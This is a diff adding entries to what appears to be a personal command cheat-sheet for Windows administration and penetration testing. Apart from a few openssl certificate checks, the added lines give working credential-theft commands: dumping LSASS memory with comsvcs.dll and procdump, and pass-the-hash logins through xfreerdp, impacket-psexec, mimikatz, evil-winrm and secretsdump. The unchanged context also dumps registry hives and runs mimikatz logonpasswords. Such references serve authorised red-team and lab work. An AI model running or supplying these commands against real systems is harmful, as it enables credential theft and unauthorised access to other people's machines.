@@ -47,6 +47,10 @@ reg save hklm\security c:\windows\temp\security.save
 reg save hklm\system c:\windows\temp\system.save
 python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
+#create dump file from lsass.exe process
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
+procdump -ma lsass.exe lsass_dump
+
 # mimikatz
 sekurlsa::minidump c:\path\to\file.dmp
 sekurlsa::logonpasswords
@@ -219,3 +223,21 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalA
 #Check and debug smtp server certificate (and dates)
 openssl s_client -crlf -starttls smtp -CAfile /etc/ssl/certs/certSIGN_ROOT_CA.pem -connect smtps.myorg.com:587
 echo QUIT | openssl s_client -crlf -starttls smtp -CAfile /etc/ssl/certs/certSIGN_ROOT_CA.pem -connect smtps.myorg.com:587 | openssl x509 -noout -dates
+
+#XfreeRDP login with pass the hash (pass_the_hash)
+xfreerdp /u:<user> /d:<domain> /pth:<ntlm_hash> /v:<ip_address>
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+#impacket psexec pass the hash
+impacket-psexec -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<ip_address>
+
+#mimikatz login with pass the hash
+Privilege::debug
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell.exe
+
+#evil-winrm login with pass the hash
+evil-winrm -i <ip_address> -u <username> -H <ntlm_hash>
+
+#secretsdump with pass the hash
+secretsdump.py <User>@<IP> -hashes <Hash>
+secretsdump.py moe@10.10.10.100 -hashes aad321b35b51404eeaad982b5b51404ee:b38ff50264b7458734d82c69794a4d8
